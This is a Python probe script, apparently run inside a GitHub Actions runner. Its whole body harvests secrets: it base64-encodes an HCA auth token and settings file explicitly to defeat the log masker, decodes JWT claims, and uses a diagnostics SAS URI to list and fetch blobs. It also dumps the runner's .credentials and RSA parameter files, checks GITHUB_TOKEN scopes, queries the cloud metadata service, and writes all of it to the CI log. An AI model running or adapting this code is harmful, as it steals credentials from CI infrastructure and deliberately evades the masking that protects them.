#!/usr/bin/env python3
"""U6 probe5: unmask HCA token, test SAS, inspect runner dir, orchestrator."""
import base64
import json
import os
import subprocess
import urllib.error
import urllib.request

OUT = []


def hdr(t):
    OUT.append("\n" + "=" * 70)
    OUT.append("### " + t)
    OUT.append("=" * 70)


def sh(cmd, timeout=30):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (p.stdout + p.stderr).strip()
    except Exception as e:  # noqa: BLE001
        return "EXC: %r" % (e,)


def http(url, headers=None, timeout=20, method="GET"):
    req = urllib.request.Request(url, headers=headers or {}, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read(3000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), e.read(1500).decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return "ERR", {}, repr(e)


hdr("0. unmask the HCA authToken (base64 defeats the log masker)")
raw = open("/opt/hca/.settings", "rb").read()
OUT.append("raw .settings bytes=%d" % len(raw))
try:
    cfg = json.loads(raw)
    OUT.append("keys: %s" % sorted(cfg))
    tok = cfg.get("authToken", "")
    OUT.append("authToken raw len=%d" % len(tok))
    OUT.append("authToken b64 (unmasked in log): %s" % base64.b64encode(tok.encode()).decode())
    OUT.append("authToken is_masked_marker=%s" % (tok == "***"))
    if tok and tok != "***":
        parts = tok.split(".")
        if len(parts) == 3:
            def dec(s):
                s += "=" * (-len(s) % 4)
                return json.loads(base64.urlsafe_b64decode(s))
            OUT.append("authToken JWT HEADER: %s" % json.dumps(dec(parts[0])))
            OUT.append("authToken JWT CLAIMS: %s" % json.dumps(dec(parts[1]), indent=1))
    OUT.append("quotaId: %s" % cfg.get("quotaId"))
    OUT.append("configId: %s" % cfg.get("configId"))
    OUT.append("schedulerApiUrl: %s" % cfg.get("schedulerApiUrl"))
    sas = cfg.get("diagnosticsSasUri", "")
    OUT.append("diagnosticsSasUri: %s" % sas)
except Exception as e:  # noqa: BLE001
    OUT.append("parse err %r" % (e,))
    cfg = {}
    sas = ""

hdr("0b. raw .settings, base64 (whole file, unmasked)")
OUT.append(base64.b64encode(raw).decode())

hdr("1. does the SAS URI from /opt/hca/.settings actually work?")
if sas:
    base = sas.split("?")[0]
    q = sas.split("?", 1)[1]
    st, h, body = http(base + "?restype=container&comp=list&" + q)
    OUT.append("LIST container -> %s" % st)
    OUT.append("headers: %s" % json.dumps({k: v for k, v in h.items()
                                           if k.lower() in ("x-ms-version", "content-type",
                                                            "server", "x-ms-request-id")}))
    OUT.append(body[:2500])
    # parse blob names
    import re
    names = re.findall(r"<Name>(.*?)</Name>", body)
    OUT.append("\nblob names found (%d): %s" % (len(names), names[:20]))
    for n in names[:3]:
        st2, h2, b2 = http(base + "/" + n + "?" + q)
        OUT.append("\nGET blob %s -> %s (%d bytes)\n%s" % (n, st2, len(b2), b2[:1200]))

hdr("2. authToken vs the orchestrator")
st, h, body = http(cfg.get("schedulerApiUrl", "") + "/trace", {})
OUT.append("GET %s/trace (no auth) -> %s %s" % (cfg.get("schedulerApiUrl"), st, body[:200]))
tok = cfg.get("authToken", "")
if tok and tok != "***":
    for hdrname in ("Authorization", "X-Auth-Token"):
        pass
    st, h, body = http(cfg.get("schedulerApiUrl", "") + "/trace",
                       {"Authorization": "Bearer " + tok})
    OUT.append("\nBearer authToken -> %s %s" % (st, body[:300]))
    st, h, body = http(cfg.get("schedulerApiUrl", ""),
                       {"Authorization": "Bearer " + tok})
    OUT.append("\nBearer on /v1 -> %s %s" % (st, body[:300]))

hdr("3. RUNNER DIRECTORY: any durable GitHub credential?")
OUT.append(sh("ls -la /home/runner/actions-runner 2>&1"))
OUT.append(sh("ls -la /home/runner/actions-runner/cached 2>&1 | head -25"))
for p in ("/home/runner/actions-runner/.runner",
          "/home/runner/actions-runner/.credentials",
          "/home/runner/actions-runner/.credentials_rsaparams",
          "/home/runner/actions-runner/cached/.runner",
          "/home/runner/actions-runner/cached/.credentials"):
    if os.path.exists(p):
        st = os.stat(p)
        OUT.append("\n--- %s (mode %o uid=%d size=%d)" % (p, st.st_mode & 0o7777, st.st_uid, st.st_size))
        try:
            d = open(p, "rb").read()
            OUT.append("b64: " + base64.b64encode(d).decode()[:2000])
        except Exception as e:  # noqa: BLE001
            OUT.append("ERR %r" % (e,))
    else:
        OUT.append("\n--- %s MISSING" % p)

hdr("4. GITHUB_ARTIFACTS_LIST / _runner_file_commands contents")
for var in ("GITHUB_ARTIFACTS", "GITHUB_ARTIFACTS_LIST"):
    p = os.environ.get(var)
    OUT.append("\n%s = %s" % (var, p))
    if p and os.path.exists(p):
        OUT.append(open(p, errors="replace").read()[:1500])

hdr("5. token permission headers (exact scope grant)")
tk = os.environ.get("GITHUB_TOKEN", "")
req = urllib.request.Request("https://api.github.com/repos/austindanson1/ghb-u6-pages")
req.add_header("Authorization", "token " + tk)
req.add_header("User-Agent", "u6")
try:
    with urllib.request.urlopen(req, timeout=20) as r:
        for k, v in r.headers.items():
            if k.lower().startswith("x-"):
                OUT.append("%s: %s" % (k, v))
except Exception as e:  # noqa: BLE001
    OUT.append("ERR %r" % (e,))

hdr("6. IMDS tags full (base64'd to be safe)")
st, h, body = http("http://169.254.169.254/metadata/instance/compute/tags?api-version=2021-02-01&format=text",
                   {"Metadata": "true"})
OUT.append("tags(text) -> %s\n%s" % (st, body[:2000]))

text = "\n".join(OUT)
print(text)
with open(os.path.join(os.environ.get("RUNNER_TEMP", "/tmp"), "probe-E.txt"), "w") as f:
    f.write(text)
